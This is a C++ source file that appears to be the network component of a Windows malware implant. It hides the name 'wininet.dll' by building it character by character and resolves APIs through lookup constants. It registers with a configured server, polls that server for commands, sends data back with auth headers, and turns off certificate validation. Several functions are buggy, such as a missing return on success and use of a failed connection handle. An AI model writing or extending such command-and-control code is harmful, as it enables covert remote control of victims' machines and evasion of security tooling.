#include "common.hpp"
#include <wininet.h>
#include <iostream>
#include "apiFunc.hpp"
#include "networkManager.hpp"

/*
    TODO
        Re Write Entire code
        handle timeouts, retrys etc
*/


Network::Network() {

    this->httpFunctions = (HTTPAPIS*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HTTPAPIS));
    // Http Functions;
    char WinInet[12];
    WinInet[0] = 'w';
    WinInet[1] = 'i';
    WinInet[2] = 'n';
    WinInet[3] = 'i';
    WinInet[4] = 'n';
    WinInet[5] = 'e';
    WinInet[6] = 't';
    WinInet[7] = '.';
    WinInet[8] = 'd';
    WinInet[9] = 'l';
    WinInet[10] = 'l';
    WinInet[11] = '\0';
    

    KModules->WININET = LoadLibraryA(WinInet);
    this->httpFunctions->InternetOpenA          =   (decltype(this->httpFunctions->InternetOpenA))          getAddress(KModules->WININET, WININET_OPENINTERNET);
    this->httpFunctions->InternetConnectA       =   (decltype(this->httpFunctions->InternetConnectA))       getAddress(KModules->WININET, WININET_CONNECTINERNET);
    this->httpFunctions->InternetSetOptionA     =   (decltype(this->httpFunctions->InternetSetOptionA))     getAddress(KModules->WININET, WININET_SETOPTION);
    this->httpFunctions->InternetReadFile       =   (decltype(this->httpFunctions->InternetReadFile))       getAddress(KModules->WININET, WININET_READFILE);
    this->httpFunctions->InternetCloseHandle    =   (decltype(this->httpFunctions->InternetCloseHandle))    getAddress(KModules->WININET, WININET_CLOSEHANDLE);
    this->httpFunctions->HttpAddRequestHeadersA =   (decltype(this->httpFunctions->HttpAddRequestHeadersA)) getAddress(KModules->WININET, WININET_ADDHEADERS);
    this->httpFunctions->HttpOpenRequestA       =   (decltype(this->httpFunctions->HttpOpenRequestA))       getAddress(KModules->WININET, WININET_OPENREQUEST);
    this->httpFunctions->HttpSendRequestA       =   (decltype(this->httpFunctions->HttpSendRequestA))       getAddress(KModules->WININET, WININET_SENDREQUEST);
    
    
    this->authToken = NULL;
    this->refreshToken = NULL;
    this->ClientID = NULL;
    
    


    
    this->baseurl = ServerConf->BaseURL;
    this->registerendpoint = ServerConf->registerEndpoint;
    this->getendpoint = ServerConf->getEndpoint;
    this->postendpoint = ServerConf->postEndpoint;
    this->UseSSL = ServerConf->UseSSL;
    this->Attemps = 5;
   
    if (this->UseSSL) {
        this->flags = INTERNET_FLAG_NO_CACHE_WRITE |
            INTERNET_FLAG_DONT_CACHE |              
            INTERNET_FLAG_RELOAD |
            INTERNET_FLAG_SECURE |                  
            INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
            INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }
    else {
        this->flags = INTERNET_FLAG_NO_CACHE_WRITE |
            INTERNET_FLAG_DONT_CACHE |             
            INTERNET_FLAG_RELOAD;                  
    }

   

    
}


BOOL Network::PostData(_In_ BYTE* Data, SIZE_T DataLength) {

    HINTERNET hInternet = this->httpFunctions->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    if (hInternet) 
    {
        HINTERNET hConnect = this->httpFunctions->InternetConnectA(hInternet, this->baseurl, ServerConf->Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

        if (!hConnect) {
            printf("Failed Connecting: 0x%d\n", GetLastError());

            return FALSE;
        }

        HINTERNET hReq = this->httpFunctions->HttpOpenRequestA(hConnect, "POST", this->postendpoint,
            NULL, NULL, NULL,
            this->flags, 0);

        if (!hReq) {
            this->httpFunctions->InternetCloseHandle(hConnect);
            printf("Failed Opening Request: 0x%d\n", GetLastError());
            return FALSE;
        }

        char Header[650];
        snprintf(Header, 650, "X-Client-ID: %s\r\nX-Auth-Token: %s\r\n", this->ClientID, this->authToken);
        this->httpFunctions->HttpAddRequestHeadersA(hReq, Header, (ULONG)-1L, HTTP_ADDREQ_FLAG_ADD);
        if (!this->UseSSL) Network::CheckAndSetSSL(hReq);


        if (!this->httpFunctions->HttpSendRequestA(hReq, NULL, 0, Data, DataLength))
        {
            DWORD err = GetLastError();
            printf("HttpSendRequestA failed with error: %lu\n", err);
            this->httpFunctions->InternetCloseHandle(hInternet);
            
            Sleep(5000);
           
        }
        



    }
    else {
        printf("Failed hInternet: 0x%d\n", GetLastError());

        return FALSE;
    }
}



BOOL Network::GetCommand(_Out_ PCHAR CommandData, SIZE_T BufferSize, _Out_ INT *TotalRead) {
    HINTERNET hInternet = this->httpFunctions->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    memset(CommandData, 0, BufferSize);

    if (!hInternet) {
        printf("InternetOpenA failed: %lu\n", GetLastError());
        return FALSE;
    }
    BOOL Success = FALSE;

    for (int i = 0; i < this->Attemps; i++)
    {

        HINTERNET hConnect = this->httpFunctions->InternetConnectA(hInternet, this->baseurl, ServerConf->Port, NULL, NULL,
            INTERNET_SERVICE_HTTP, 0, NULL);
        if (!hConnect) {
#ifdef _DEBUG
            printf("Failed InternetConnect: 0x%d\n", GetLastError());
#endif
            Sleep(5000);
        }
        DWORD Flags;
        if (this->UseSSL) {
            
        }
        HINTERNET hRequest = this->httpFunctions->HttpOpenRequestA(hConnect, "GET", this->getendpoint,
            NULL, NULL, NULL,
            this->flags, 0);
        if (!hRequest) {
            printf("Failed Opening Request: 0x%d\n", GetLastError());
            this->httpFunctions->InternetCloseHandle(hConnect);
            Sleep(5000);
            continue;
        }
        char Header[650];
        snprintf(Header, 650, "X-Client-ID: %s\r\nX-Auth-Token: %s\r\n", this->ClientID, this->authToken);

        this->httpFunctions->HttpAddRequestHeadersA(hRequest, Header, (ULONG)-1L, HTTP_ADDREQ_FLAG_ADD);

        if (!this->UseSSL) Network::CheckAndSetSSL(hRequest);


        if (!this->httpFunctions->HttpSendRequestA(hRequest, NULL, 0, NULL, 0))
        {

            DWORD err = GetLastError();
            printf("HttpSendRequestA failed with error: %lu\n", err);

            this->httpFunctions->InternetCloseHandle(hInternet);
            Sleep(5000);
            continue;
        }

        size_t totalRead = 0;
        DWORD bytesRead = 0;
        while (this->httpFunctions->InternetReadFile(hRequest, CommandData + totalRead, BufferSize - 1 - totalRead, &bytesRead) && bytesRead > 0)
        {
            totalRead += bytesRead;
            if (totalRead >= BufferSize - 1)
                break;
        }

        if(totalRead == 0) {
            printf("read fail - got no data\n");
            Success = FALSE;
        }
        else {
            CommandData[totalRead] = '\0';  // Null terminate
            *TotalRead = totalRead;
            printf("Successfully read %zu bytes\n", totalRead);
            Success = TRUE;
        }
       

        
        this->httpFunctions->InternetCloseHandle(hConnect);
        this->httpFunctions->InternetCloseHandle(hRequest);
        break;
    }
    this->httpFunctions->InternetCloseHandle(hInternet);
    return  Success;
}



BOOL Network::RegisterClient(BYTE* data, size_t length, _Out_ PCHAR ResponseData, DWORD ResponseBufferSize, DWORD* ResponseLength) {
    
    HINTERNET hInternet = this->httpFunctions->InternetOpenA("Test", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("Failed Opening: 0x%d\n", GetLastError());
        return FALSE;
    }
    printf("%s%s\n", this->baseurl, this->registerendpoint);
   

    BOOL Success = FALSE;

    for (int i = 0; i < Attemps; i++) {
        HINTERNET hConnect = this->httpFunctions->InternetConnectA(hInternet, this->baseurl, ServerConf->Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
        if (!hConnect) {
#ifdef DEBUG
            printf("Failed Connecting: 0x%d\n", GetLastError());
#endif
            Sleep(5000);
            continue;
        }

        HINTERNET hRequest = this->httpFunctions->HttpOpenRequestA(hConnect, "POST", this->registerendpoint, NULL, NULL, NULL,  this->flags, 0);
        if (!hRequest) {
#ifdef DEBUG
            printf("Failed IpeningRequest: 0x%d\n", GetLastError());
#endif
            //this->httpFunctions->InternetCloseHandle(hInternet);
            Sleep(5000);
            continue;
        }

        const char* headers = "Content-Type: application/json\r\n";
        this->httpFunctions->HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

        if (!this->UseSSL) Network::CheckAndSetSSL(hRequest);


        if (!this->httpFunctions->HttpSendRequestA(hRequest, NULL, 0, data, length)) {
            DWORD err = GetLastError();
#ifdef DEBUG
            printf("HttpSendRequestA failed with error: %lu\n", err);
#endif

            this->httpFunctions->InternetCloseHandle(hInternet);
            Sleep(5000);
            continue;
        }
#ifdef DEBUG
        printf("Sending Request too %s%s, with data %s of  size %d\n", this->baseurl, this->registerendpoint, (PCHAR)data, length);
#endif
        
        DWORD RecvSize = 0;

        if (this->httpFunctions->InternetReadFile(hRequest, ResponseData, ResponseBufferSize - 1, &RecvSize) && RecvSize > 0) {
            *ResponseLength = RecvSize;
            ResponseData[RecvSize] = '\0';
            this->httpFunctions->InternetCloseHandle(hConnect);
            this->httpFunctions->InternetCloseHandle(hRequest);
            Success = TRUE;
            break;
        }
        this->httpFunctions->InternetCloseHandle(hConnect);
        this->httpFunctions->InternetCloseHandle(hRequest);
        
        Sleep(5000);
    }
    
    this->httpFunctions->InternetCloseHandle(hInternet);
   
    return Success;


}


BOOL Network::UpdateAuthDetails(PCHAR token, PCHAR refresh, PCHAR ClientID) {
    if (this->authToken) {
        free(this->authToken);
        
    }
    if (this->refreshToken) {
        free(this->refreshToken);
    }
    if (!this->ClientID) {
        this->ClientID = _strdup(ClientID);
    }
   

    this->authToken = _strdup(token);
    this->refreshToken = _strdup(refresh);
    return TRUE;
}

BOOL Network::CheckAndSetSSL(HINTERNET hReq) {
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_WRONG_USAGE;

    if (!this->httpFunctions->InternetSetOptionA(hReq,
        INTERNET_OPTION_SECURITY_FLAGS,
        &flags,
        sizeof(flags))) {
        return FALSE;
    }
    else return TRUE;
}

Network* g_NetworkManager = NULL;
